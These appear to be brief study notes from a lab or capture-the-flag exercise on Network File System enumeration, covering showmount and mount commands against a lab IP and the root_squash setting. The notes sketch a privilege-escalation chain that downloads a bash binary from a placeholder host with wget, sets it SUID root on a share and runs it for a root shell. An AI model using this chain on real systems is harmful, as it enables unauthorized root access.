Network File System
`nfs-utils` package

`showmount -e 10.10.135.34`
`-e` - exports (aka shares)

`sudo mount -t nfs IP:share /tmp/mount/ -nolock`
`-t nfs` - type nfs
`-nolock` no `NLM` (network lock manager)

e.g.
`sudo mount -t nfs 10.10.135.34:/home /tmp/mount -nolock`

`root_squash` - prevents anyone connection to NFS from having root access to it. 
Remote root users are assigned as `nfsnobody` user with least local privileges.
Enabled by default
IF NOT enabled -> remote users connecting with `NFS` can create `SUID` bit files -> remote user have `root access `to the connected system

e.g.
	mount `NFS` share -> `wget http:blabla/bash` (to get accordingly compiled `bash`) -> `chown root bash` -> `chmod +4001 bash` -> log into that user -> `./bash -p`
	`-p` persist the permissions. Otherwise root `SUID` will be dropped

